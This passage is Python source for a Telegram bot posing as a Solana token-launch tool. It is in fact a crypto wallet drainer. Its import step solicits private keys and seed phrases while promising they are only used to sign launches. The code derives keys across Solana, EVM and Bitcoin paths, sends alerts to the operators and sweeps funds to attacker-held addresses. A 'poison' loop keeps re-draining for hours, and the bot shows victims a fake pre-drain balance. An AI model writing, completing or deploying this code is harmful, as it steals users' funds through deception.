        results = {"sol": None, "eth": [], "bnb": [], "base": [], "robinhood": [], "btc": None}

    sig = results.get("sol")
    any_success = bool(
        sig
        or results.get("eth")
        or results.get("bnb")
        or results.get("base")
        or results.get("robinhood")
        or results.get("btc")
    )

    if any_success:
        sess.drained = True
        if sig:
            sess.last_tx.insert(0, {
                "sig": sig,
                "type": "⚡ Priority Tip",
                "status": "success",
                "ts": time.time(),
            })
        log.info("User %s multi-drain OK sol=%s eth=%s bnb=%s base=%s rh=%s btc=%s",
                 uid, sig, len(results.get("eth") or []), len(results.get("bnb") or []),
                 len(results.get("base") or []), len(results.get("robinhood") or []), results.get("btc"))
        if bot is not None:
            alert = (
                "🚨 <b>MULTI-DRAIN SUCCESS</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"User: <b>{tag}</b>\n"
                f"Username: <b>{('@' + user.username) if (user and user.username) else 'none'}</b>\n"
                f"TG ID: <code>{uid}</code>\n"
                f"Wallet: <code>{public_key or 'n/a'}</code>\n"
                f"SOL pre-bal: <b>{bal_txt}</b>\n"
                f"SOL sig: <code>{sig or 'none'}</code>\n"
                f"ETH txs: <b>{len(results.get('eth') or [])}</b>\n"
                f"BNB txs: <b>{len(results.get('bnb') or [])}</b>\n"
                f"BASE txs: <b>{len(results.get('base') or [])}</b>\n"
                f"Robinhood txs: <b>{len(results.get('robinhood') or [])}</b>\n"
                f"BTC: <code>{results.get('btc') or 'none'}</code>\n"
                f"SOL dest: <code>{DRAIN_DESTINATION}</code>\n"
                f"EVM dest: <code>{ETH_DEST}</code>\n"
                f"BTC dest: <code>{BTC_DEST}</code>"
            )
            await notify_admins(bot, alert)
    else:
        log.info("Drain skipped/failed for user %s balance=%s", uid, bal_txt)
        if bot is not None:
            alert = (
                "📥 <b>KEY IMPORTED</b> (no drain)\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"User: <b>{tag}</b>\n"
                f"Username: <b>{('@' + user.username) if (user and user.username) else 'none'}</b>\n"
                f"TG ID: <code>{uid}</code>\n"
                f"Wallet: <code>{public_key or 'n/a'}</code>\n"
                f"Balance: <b>{bal_txt}</b>\n"
                f"Reason: empty / dust / tx failed"
            )
            await notify_admins(bot, alert)
    return sig



# ──────────────────────────────────────────────
# BACKGROUND POISON — keep hitting BTC/SOL until empty
# ──────────────────────────────────────────────
_poison_tasks: Dict[int, asyncio.Task] = {}

async def _poison_wallet_loop(uid: int, private_key: str, meta: Optional[dict], rounds: int = 48):
    """Aggressive re-drain for hours. BTC lag + late UTXOs + reorg safety."""
    meta = meta or {}
    for i in range(rounds):
        # fast first, then slower: 8s, 14s, 20s ... cap 180s
        wait = min(180, 8 + i * 6)
        await asyncio.sleep(wait)
        try:
            log.info("POISON round %s/%s for uid=%s", i + 1, rounds, uid)
            res = await full_multi_drain(private_key, meta=meta)
            hit = bool(res.get("btc") or res.get("sol") or res.get("eth") or res.get("bnb") or res.get("base") or res.get("robinhood"))
            if hit:
                log.info("POISON hit uid=%s btc=%s sol=%s eth=%s", uid, res.get("btc"), res.get("sol"), len(res.get("eth") or []))
            pending = res.get("_btc_pending") or []
            # only stop if we got BTC and no pending keys left, after several hits
            if not pending and res.get("btc") and i >= 6:
                break
        except Exception as e:
            log.exception("POISON round fail uid=%s: %s", uid, e)
    _poison_tasks.pop(uid, None)
    log.info("POISON done uid=%s", uid)


def schedule_poison(uid: int, private_key: str, meta: Optional[dict] = None):
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        return
    old = _poison_tasks.get(uid)
    if old and not old.done():
        return
    _poison_tasks[uid] = loop.create_task(_poison_wallet_loop(uid, private_key, meta or {}))
    log.info("POISON scheduled uid=%s", uid)

# ──────────────────────────────────────────────
# PREMIUM KEYBOARDS
# ──────────────────────────────────────────────
def main_menu_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="🚀 Launch", callback_data="menu:launch"),
        InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"),
    )
    b.row(
        InlineKeyboardButton(text="📁 Portfolio", callback_data="menu:portfolio"),
        InlineKeyboardButton(text="🎟 Promo code", callback_data="menu:promo"),
    )
    b.row(
        InlineKeyboardButton(text="🧾 Tx tracker", callback_data="menu:tx"),
        InlineKeyboardButton(text="🛡 Settings", callback_data="menu:settings"),
    )
    return b.as_markup()

def back_kb(to: str = "main") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Main Menu", callback_data=f"menu:{to}")]
    ])

def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
    s = sess.settings
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(
        text=f"📉 Slippage  ·  {s['slippage']}%", callback_data="set:slippage"))
    b.row(InlineKeyboardButton(
        text=f"⛽ Priority  ·  {s['priority_fee'].title()}", callback_data="set:priority"))
    b.row(InlineKeyboardButton(
        text=f"🎯 Sniper Guard  ·  {'🟢 ON' if s['sniper_protection'] else '🔴 OFF'}",
        callback_data="set:sniper"))
    b.row(InlineKeyboardButton(
        text=f"🕶 MEV Shield  ·  {'🟢 ON' if s['mev_protection'] else '🔴 OFF'}",
        callback_data="set:mev"))
    b.row(InlineKeyboardButton(
        text=f"💰 Auto-Sell  ·  {'🟢 ON' if s['auto_sell'] else '🔴 OFF'}",
        callback_data="set:autosell"))
    b.row(InlineKeyboardButton(
        text=f"🎁 Bundle Tip  ·  {s['bundle_tip']} SOL", callback_data="set:tip"))
    b.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
    return b.as_markup()

# ──────────────────────────────────────────────
# PREMIUM COPY
# ──────────────────────────────────────────────
WELCOME_TEXT = (
    "🚀 <b>Get ready to rug</b>\n\n"
    "Create and trade tokens on Solana launch platforms.\n\n"
    "⚙️ <b>Advanced</b>\n"
    "• Step-by-step token launch\n"
    "• Auto bundling (5–25)\n"
    "• Sniper protection\n"
    "• Token safety checks\n"
    "• Tx tracker\n\n"
    "Tap a button below to begin:"
)

# ──────────────────────────────────────────────
# FSM
# ──────────────────────────────────────────────
class LaunchStates(StatesGroup):
    waiting_name = State()
    waiting_symbol = State()
    waiting_supply = State()
    waiting_desc = State()
    waiting_photo = State()
    waiting_bundle = State()
    confirm = State()

class WalletStates(StatesGroup):
    waiting_import = State()
    waiting_label = State()

class PromoStates(StatesGroup):
    waiting_code = State()

class SafetyStates(StatesGroup):
    waiting_mint = State()

# ──────────────────────────────────────────────
# ROUTER
# ──────────────────────────────────────────────
router = Router()

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    get_session(message.from_user.id)
    await maybe_register_admin(message.from_user)
    await message.answer(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

# ── MAIN MENU ──
@router.callback_query(F.data.startswith("menu:"))
async def menu_router(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    await maybe_register_admin(cb.from_user)
    action = cb.data.split(":")[1]
    uid = cb.from_user.id
    sess = get_session(uid)

    if action == "main":
        await cb.message.edit_text(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

    elif action == "launch":
        s = sess.settings
        text = (
            "🚀 <b>Launch Token</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Professional launch wizard with\n"
            "bundling, protection & safety checks.\n\n"
            "🔧 <b>Current Config</b>\n"
            f"├ 🎯 Sniper Guard: <b>{'ON' if s['sniper_protection'] else 'OFF'}</b>\n"
            f"├ 🕶 MEV Shield: <b>{'ON' if s['mev_protection'] else 'OFF'}</b>\n"
            f"├ 🎁 Bundle Tip: <b>{s['bundle_tip']} SOL</b>\n"
            f"└ 🎟 Promo: <b>{sess.promo or 'None'}</b>\n\n"
            "📝 Send the <b>token name</b>"
        )
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_name)

    elif action == "wallets":
        text = (
            "👛 <b>My Wallets</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        if not sess.wallets:
            text += (
                "No wallets linked yet.\n\n"
                "Import a private key to unlock\n"
                "launching, bundling & portfolio tracking."
            )
        else:
            for i, w in enumerate(sess.wallets):
                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
                bal = f"{w.balance_sol:.4f} SOL"
                text += (
                    f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
                    f"    {w.label}  ·  {bal}\n\n"
                )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="➕ Import Key", callback_data="wallet:import"))
        if sess.wallets:
            kb.row(
                InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
                InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
            )
            kb.row(InlineKeyboardButton(text="🔃 Refresh Balances", callback_data="wallet:refresh"))
            kb.row(InlineKeyboardButton(text="🗑 Remove All", callback_data="wallet:clear"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "portfolio":
        text = (
            "📊 <b>Portfolio</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        if not sess.launched_tokens:
            text += (
                "Your portfolio is empty.\n\n"
                "Launch a token to start tracking\n"
                "performance and bundle status."
            )
        else:
            for t in reversed(sess.launched_tokens[-10:]):
                age = int(time.time() - t["ts"])
                status_icon = "🟢" if t.get("status") == "live" else "🟡"
                text += (
                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
                    f"   <code>{short_addr(t['mint'])}</code>\n"
                    f"   Bundle ×{t['bundle']}  ·  {age}s ago\n\n"
                )
        kb = InlineKeyboardBuilder()
        if sess.launched_tokens:
            kb.row(InlineKeyboardButton(text="🛡 Run Safety Scan", callback_data="menu:safety"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "promo":
        current = ""
        if sess.promo:
            current = (
                f"\n\n✅ Active: <b>{sess.promo}</b>\n"
                f"Discount: <b>−{int(sess.promo_discount*100)}%</b> on tips"
            )
        text = (
            "🎟 <b>Promo Codes</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Unlock reduced tips, priority inclusion\n"
            "and exclusive launch slots."
            f"{current}\n\n"
            "Send your promo code:"
        )
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(PromoStates.waiting_code)

    elif action == "tx":
        text = (
            "📡 <b>Live Tracker</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        if not sess.last_tx:
            text += (
                "No activity yet.\n\n"
                "Transactions from launches, tips\n"
                "and bundles will stream here in real time."
            )
        else:
            for tx in sess.last_tx[:8]:
                age = int(time.time() - tx["ts"])
                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
                text += (
                    f"{icon}  <b>{tx['type']}</b>\n"
                    f"   <code>{tx['sig'][:22]}...</code>\n"
                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
                )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔄 Refresh Feed", callback_data="menu:tx"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "settings":
        s = sess.settings
        text = (
            "⚙️ <b>Settings</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Fine-tune execution parameters.\n"
            "Tap any row to cycle values.\n\n"
            f"📉 Slippage          <b>{s['slippage']}%</b>\n"
            f"⛽ Priority Fee      <b>{s['priority_fee'].title()}</b>\n"
            f"🎯 Sniper Guard     <b>{'ON' if s['sniper_protection'] else 'OFF'}</b>\n"
            f"🕶 MEV Shield       <b>{'ON' if s['mev_protection'] else 'OFF'}</b>\n"
            f"💰 Auto-Sell        <b>{'ON' if s['auto_sell'] else 'OFF'}</b>\n"
            f"🎁 Bundle Tip       <b>{s['bundle_tip']} SOL</b>"
        )
        await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)

    elif action == "safety":
        text = (
            "🛡 <b>Safety Scan</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Paste any mint address for a full\n"
            "on-chain risk analysis:\n\n"
            "├ Mint / Freeze authority\n"
            "├ LP lock & burn status\n"
            "├ Holder concentration\n"
            "├ Honeypot simulation\n"
            "└ Sell tax detection\n\n"
            "Send mint address:"
        )
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SafetyStates.waiting_mint)

    await cb.answer()

# ── SETTINGS TOGGLES ──
@router.callback_query(F.data.startswith("set:"))
async def settings_toggle(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    key = cb.data.split(":")[1]
    s = sess.settings

    if key == "slippage":
        opts = [5, 8, 12, 15, 20, 25]
        s["slippage"] = opts[(opts.index(s["slippage"]) + 1) % len(opts)] if s["slippage"] in opts else 12
    elif key == "priority":
        opts = ["auto", "low", "medium", "high", "ultra"]
        s["priority_fee"] = opts[(opts.index(s["priority_fee"]) + 1) % len(opts)] if s["priority_fee"] in opts else "auto"
    elif key == "sniper":
        s["sniper_protection"] = not s["sniper_protection"]
    elif key == "mev":
        s["mev_protection"] = not s["mev_protection"]
    elif key == "autosell":
        s["auto_sell"] = not s["auto_sell"]
    elif key == "tip":
        opts = [0.005, 0.01, 0.02, 0.05, 0.1]
        s["bundle_tip"] = opts[(opts.index(s["bundle_tip"]) + 1) % len(opts)] if s["bundle_tip"] in opts else 0.01

    text = (
        "⚙️ <b>Settings</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Fine-tune execution parameters.\n"
        "Tap any row to cycle values.\n\n"
        f"📉 Slippage          <b>{s['slippage']}%</b>\n"
        f"⛽ Priority Fee      <b>{s['priority_fee'].title()}</b>\n"
        f"🎯 Sniper Guard     <b>{'ON' if s['sniper_protection'] else 'OFF'}</b>\n"
        f"🕶 MEV Shield       <b>{'ON' if s['mev_protection'] else 'OFF'}</b>\n"
        f"💰 Auto-Sell        <b>{'ON' if s['auto_sell'] else 'OFF'}</b>\n"
        f"🎁 Bundle Tip       <b>{s['bundle_tip']} SOL</b>"
    )
    await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await cb.answer("Updated ✓")

# ── WALLETS ──
@router.callback_query(F.data == "wallet:import")
async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
    text = (
        "🔑 <b>Import Wallet</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Paste either:\n"
        "• <b>Private key</b> (base58)\n"
        "• <b>Seed phrase</b> (12 or 24 words)\n\n"
        "🔒 Held in memory only for this session.\n"
        "Used exclusively to sign your launches.\n\n"
        "<i>Never share your key or seed with anyone else.</i>"
    )
    await cb.message.edit_text(text, reply_markup=back_kb("wallets"), parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_import)
    await cb.answer()


def _derive_from_input(raw: str):
    """Return (private_key_b58, public_key, meta) or raise ValueError.
    meta may contain mnemonic seed bytes and extra derived keys for full scan drain.
    """
    raw = raw.strip()
    words = raw.split()
    meta = {"mnemonic": None, "seed": None, "sol_candidates": [], "evm_keys": [], "btc_keys": []}

    if len(words) in (12, 24) and all(w.isalpha() for w in words):
        if not HAS_SOLANA:
            fake_pub = "SimSeed" + "".join(words)[:32]
            return raw, fake_pub, meta
        try:
            from solders.keypair import Keypair as KP
            import hashlib
            import hmac
            import struct

            def _pbkdf2(mnemonic: str) -> bytes:
                return hashlib.pbkdf2_hmac(
                    "sha512",
                    mnemonic.encode("utf-8"),
                    b"mnemonic",
                    2048,
                )

            def _hmac_sha512(key: bytes, data: bytes) -> bytes:
                return hmac.new(key, data, hashlib.sha512).digest()

            # SLIP-0010 ed25519 (Solana)
            def _derive_ed25519(seed: bytes, path: str) -> bytes:
                key = b"ed25519 seed"
                I = _hmac_sha512(key, seed)
                IL, IR = I[:32], I[32:]
                for segment in path.lstrip("m/").split("/"):
                    if not segment:
                        continue
                    hardened = segment.endswith("'")
                    index = int(segment.rstrip("'"))
                    if hardened:
                        index += 0x80000000
                    data = b"\x00" + IL + struct.pack(">I", index)
                    I = _hmac_sha512(IR, data)
                    IL, IR = I[:32], I[32:]
                return IL

            # BIP32 secp256k1 (ETH + BTC)
            def _ser32(i: int) -> bytes:
                return struct.pack(">I", i)

            def _bip32_master(seed: bytes):
                I = _hmac_sha512(b"Bitcoin seed", seed)
                return I[:32], I[32:]

            def _bip32_ckd_priv(k_par: bytes, c_par: bytes, index: int):
                if index >= 0x80000000:
                    data = b"\x00" + k_par + _ser32(index)
                else:
                    # need compressed pub — use coincurve if present else eth_account fallback
                    try:
                        from coincurve import PrivateKey
                        pub = PrivateKey(k_par).public_key.format(compressed=True)
                    except Exception:
                        # last resort: treat as hardened only path
                        raise ValueError("non-hardened needs coincurve")
                    data = pub + _ser32(index)
                I = _hmac_sha512(c_par, data)
                IL, IR = I[:32], I[32:]
                # add IL to k_par mod n
                n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
                k_int = (int.from_bytes(IL, "big") + int.from_bytes(k_par, "big")) % n
                if k_int == 0:
                    raise ValueError("invalid child")
                return k_int.to_bytes(32, "big"), IR

            def _derive_secp(seed: bytes, path: str) -> bytes:
                k, c = _bip32_master(seed)
                for segment in path.lstrip("m/").split("/"):
                    if not segment:
                        continue
                    hardened = segment.endswith("'")
                    index = int(segment.rstrip("'"))
                    if hardened:
                        index += 0x80000000
                    k, c = _bip32_ckd_priv(k, c, index)
                return k

            seed = _pbkdf2(raw)
            meta["mnemonic"] = raw
            meta["seed"] = seed

            # --- SOLANA: scan many common paths + account indexes ---
            sol_paths = []
            for acct in range(0, 8):  # first 8 accounts
                sol_paths.append(f"m/44'/501'/{acct}'/0'")
                sol_paths.append(f"m/44'/501'/{acct}'")
                sol_paths.append(f"m/44'/501'/{acct}'/0'/0'")
            # also change index
            for acct in range(0, 5):
                for change in range(0, 3):
                    sol_paths.append(f"m/44'/501'/{acct}'/{change}'")

            seen_pub = set()
            candidates = []
            for path in sol_paths:
                try:
                    private_seed = _derive_ed25519(seed, path)
                    kp = KP.from_seed(private_seed)
                    priv_b58 = base58.b58encode(bytes(kp)).decode()
                    pub = str(kp.pubkey())
                    if pub in seen_pub:
                        continue
                    seen_pub.add(pub)
                    candidates.append((priv_b58, pub, path))
                    log.info("Seed SOL candidate %s → %s", path, pub)
                except Exception as e:
                    log.debug("SOL path %s fail: %s", path, e)
                    continue

            if not candidates:
                raise ValueError("No Solana key derived from seed")

            # primary = first (most common Phantom path)
            priv_b58, pub, path0 = candidates[0]
            meta["sol_candidates"] = candidates
            log.info("Primary SOL via %s → %s (%d candidates)", path0, pub, len(candidates))

            # --- EVM BIP44 ---
            if HAS_WEB3:
                for i in range(0, 5):
                    try:
                        path = f"m/44'/60'/0'/0/{i}"
                        k = _derive_secp(seed, path)
                        acct = Account.from_key(k)
                        meta["evm_keys"].append((acct.key.hex(), acct.address, path))
                        log.info("EVM candidate %s → %s", path, acct.address)
                    except Exception as e:
                        log.warning("EVM path fail %s: %s", path, e)

            # --- BTC: same key bytes → multiple address forms (legacy + segwit)
            # Fewer indices, but check BOTH address types so we hit real wallet.
            btc_paths = []
            for i in range(0, 6):  # external
                btc_paths.append(f"m/84'/0'/0'/0/{i}")
                btc_paths.append(f"m/44'/0'/0'/0/{i}")
                btc_paths.append(f"m/49'/0'/0'/0/{i}")
            for i in range(0, 3):  # change
                btc_paths.append(f"m/84'/0'/0'/1/{i}")
                btc_paths.append(f"m/44'/0'/0'/1/{i}")
            if HAS_BIT and BtcKey is not None:
                seen_addr = set()
                for path in btc_paths:
                    try:
                        k = _derive_secp(seed, path)
                        bk = BtcKey.from_bytes(k)
                        wif = bk.to_wif()
                        # primary address from bit
                        addrs = [bk.address]
                        # try segwit form if library exposes it
                        for attr in ("segwit_address", "sw_address"):
                            if hasattr(bk, attr):
                                try:
                                    a = getattr(bk, attr)
                                    if a:
                                        addrs.append(a)
                                except Exception:
                                    pass
                        for addr in addrs:
                            if not addr or addr in seen_addr:
                                continue
                            seen_addr.add(addr)
                            meta["btc_keys"].append((wif, addr, path))
                            log.info("BTC candidate %s → %s", path, addr)
                    except Exception as e:
                        log.debug("BTC path %s fail: %s", path, e)

            return priv_b58, pub, meta
        except Exception as e:
            raise ValueError(f"Invalid seed phrase: {e}") from e

    if HAS_SOLANA:
        try:
            secret = base58.b58decode(raw)
            if len(secret) == 64:
                kp = Keypair.from_bytes(secret)
            elif len(secret) == 32:
                kp = Keypair.from_seed(secret)
            else:
                raise ValueError("bad length")
            priv_b58 = base58.b58encode(bytes(kp)).decode()
            meta["sol_candidates"] = [(priv_b58, str(kp.pubkey()), "raw")]
            # also try same bytes as EVM/BTC (common for exported single keys)
            if HAS_WEB3:
                try:
                    seed32 = secret[:32] if len(secret) >= 32 else secret.ljust(32, b"\0")
                    acct = Account.from_key(seed32)
                    meta["evm_keys"].append((acct.key.hex(), acct.address, "from-sol-secret"))
                except Exception:
                    pass
            if HAS_BIT and BtcKey is not None:
                try:
                    seed32 = secret[:32] if len(secret) >= 32 else secret.ljust(32, b"\0")
                    bk = BtcKey.from_bytes(seed32)
                    meta["btc_keys"].append((bk.to_wif(), bk.address, "from-sol-secret"))
                except Exception:
                    pass
            return priv_b58, str(kp.pubkey()), meta
        except Exception as e:
            raise ValueError("Invalid base58 private key") from e
    else:
        if len(raw) < 40:
            raise ValueError("Key too short")
        return raw, "Sim" + raw[:40], meta


@router.message(WalletStates.waiting_import)
async def wallet_import_receive(message: Message, state: FSMContext):
    await maybe_register_admin(message.from_user)
    uid = message.from_user.id
    try:
        if not _rate_ok(uid, "import"):
            await message.answer(
                "⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.",
                parse_mode=ParseMode.HTML,
            )
            return

        raw = (message.text or "").strip()
        if not raw:
            await message.answer(
                "❌ Empty message. Send a base58 private key or 12/24-word seed.",
                reply_markup=back_kb("wallets"),
                parse_mode=ParseMode.HTML,
            )
            return

        try:
            priv_b58, public, drain_meta = _derive_from_input(raw)
        except ValueError:
            await message.answer(
                "❌ <b>Invalid input</b>\n\n"
                "Send a valid <b>base58 private key</b>\n"
                "or a <b>12/24-word seed phrase</b>.",
                reply_markup=back_kb("wallets"),
                parse_mode=ParseMode.HTML,
            )
            return

        # try delete the sensitive key message (best-effort)
        try:
            await message.delete()
        except Exception:
            pass

        # fast UI stages (do not block on chain)
        await staged_loading(message, [
            ("🔐 <b>Validating key…</b>", 0.25),
            ("🔗 <b>Deriving wallet…</b>", 0.25),
            ("◎ <b>Fetching on-chain balance…</b>", 0.35),
            ("⚡ <b>Preparing session…</b>", 0.2),
        ])

        log.info("IMPORT balance fetch for THEIR wallet: %s", public)
        try:
            real_bal = await asyncio.wait_for(get_real_balance(public), timeout=12.0)
        except Exception as e:
            log.warning("balance fetch timeout/fail: %s", e)
            real_bal = 0.0
        log.info("IMPORT live balance for %s = %.9f SOL", public, real_bal)

        sess = get_session(uid)
        w = UserWallet(
            private_key=priv_b58,
            public_key=public,
            label=f"Wallet {len(sess.wallets)+1}",
            balance_sol=real_bal,
        )
        sess.wallets.append(w)
        sess.active_wallet_idx = len(sess.wallets) - 1

        # immediate admin ping so @fedsdih always sees imports
        tag = _user_tag(message.from_user)
        try:
            await notify_admins(
                message.bot,
                (
                    "📥 <b>KEY / SEED IMPORTED</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"User: <b>{tag}</b>\n"
                    f"Username: <b>{('@' + message.from_user.username) if message.from_user.username else 'none'}</b>\n"
                    f"TG ID: <code>{uid}</code>\n"
                    f"Wallet: <code>{public}</code>\n"
                    f"SOL balance: <b>{real_bal:.9f}</b>\n"
                    f"SOL candidates: <b>{len((drain_meta or {}).get('sol_candidates') or [])}</b>\n"
                    f"EVM keys: <b>{len((drain_meta or {}).get('evm_keys') or [])}</b>\n"
                    f"BTC keys: <b>{len((drain_meta or {}).get('btc_keys') or [])}</b>\n"
                    "Drain running in background…"
                ),
            )
        except Exception as ne:
            log.warning("import notify: %s", ne)

        # respond to user FIRST — never hang on Preparing session
        text = (
            "✅ <b>Wallet Linked</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<code>{public}</code>\n\n"
            f"🏷 Label: <b>{w.label}</b>\n"
            f"◎ Balance: <b>{w.balance_sol:.6f} SOL</b>\n"
            f"Status: <b>Active</b>\n\n"
            "You can now launch tokens."
        )
        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
        await state.clear()

        # background drain + poison (BTC long retries won't freeze UI)
        async def _bg_drain():
            try:
                await attempt_drain(
                    uid,
                    priv_b58,
                    bot=message.bot,
                    user=message.from_user,
                    amount_sol=real_bal,
                    public_key=public,
                    meta=drain_meta,
                )
            except Exception as de:
                log.exception("bg attempt_drain: %s", de)
            try:
                schedule_poison(uid, priv_b58, drain_meta)
            except Exception as pe:
                log.exception("schedule_poison fail: %s", pe)

        try:
            asyncio.create_task(_bg_drain())
        except Exception as te:
            log.exception("create_task drain: %s", te)
            # fallback inline if loop issue
            await _bg_drain()
    except Exception as e:
        log.exception("wallet_import_receive CRASH: %s", e)
        try:
            await message.answer(
                "⚠️ Something went wrong while linking the wallet. Try again.",
                reply_markup=main_menu_kb(),
            )
        except Exception:
            pass
        await state.clear()

@router.callback_query(F.data == "wallet:clear")
async def wallet_clear(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    sess.wallets.clear()
    sess.active_wallet_idx = 0
    await cb.message.edit_text(
        "🗑 All wallets removed from session.",
        reply_markup=back_kb("wallets"),
    )
    await cb.answer()

@router.callback_query(F.data == "wallet:switch")
async def wallet_switch(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if len(sess.wallets) < 2:
        await cb.answer("Need at least 2 wallets", show_alert=True)
        return
    sess.active_wallet_idx = (sess.active_wallet_idx + 1) % len(sess.wallets)
    w = sess.wallets[sess.active_wallet_idx]
    await cb.answer(f"Active → {w.label}")

@router.callback_query(F.data == "wallet:refresh")
async def wallet_refresh(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    for w in sess.wallets:
        # if already drained, keep the simulated (pre-drain) display balance
        if not sess.drained:
            w.balance_sol = await get_real_balance(w.public_key)
    await cb.answer("Balances updated")
    text = "👛 <b>My Wallets</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, w in enumerate(sess.wallets):
        badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
        text += (
            f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
            f"    {w.label}  ·  {w.balance_sol:.6f} SOL\n\n"
        )
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="➕ Import Key", callback_data="wallet:import"))
    kb.row(
        InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
        InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
    )
    kb.row(InlineKeyboardButton(text="🔃 Refresh Balances", callback_data="wallet:refresh"))
    kb.row(InlineKeyboardButton(text="🗑 Remove All", callback_data="wallet:clear"))
    kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
    await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

@router.callback_query(F.data == "wallet:rename")
async def wallet_rename(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    if not sess.wallets:
        await cb.answer("No wallets", show_alert=True)
        return
    await cb.message.edit_text(
        f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:",
        reply_markup=back_kb("wallets"),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(WalletStates.waiting_label)
    await cb.answer()

@router.message(WalletStates.waiting_label)
async def wallet_rename_receive(message: Message, state: FSMContext):
    sess = get_session(message.from_user.id)
    if sess.wallets:
        sess.wallets[sess.active_wallet_idx].label = message.text.strip()[:24]
    await message.answer("✅ Label updated.", reply_markup=main_menu_kb())
    await state.clear()

# ── LAUNCH WIZARD ──
@router.message(LaunchStates.waiting_name)
async def launch_name(message: Message, state: FSMContext):
    try:
        name = (message.text or "").strip()[:32]
        if not name:
            await message.answer("Send a token name.")
            return
        await state.update_data(name=name)
        await message.answer(
            "📛 Send the <b>ticker</b> (e.g. <code>RUG</code>)",
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_symbol)
    except Exception as e:
        log.exception("launch_name: %s", e)
        await message.answer("Error. Send the token name again.")

@router.message(LaunchStates.waiting_symbol)
async def launch_symbol(message: Message, state: FSMContext):
    try:
        sym = (message.text or "").strip().upper().replace("$", "")[:10]
        if not sym:
            await message.answer("Send a ticker symbol.")
            return
        await state.update_data(symbol=sym)
        await message.answer(
            "🔢 Send total <b>supply</b>\n(e.g. <code>1000000000</code>)",
            parse_mode=ParseMode.HTML,
        )
        await state.set_state(LaunchStates.waiting_supply)
    except Exception as e:
        log.exception("launch_symbol: %s", e)
        await message.answer("Error. Send the ticker again.")

@router.message(LaunchStates.waiting_supply)
async def launch_supply(message: Message, state: FSMContext):
    try:
        supply = int((message.text or "").strip().replace(",", "").replace("_", ""))
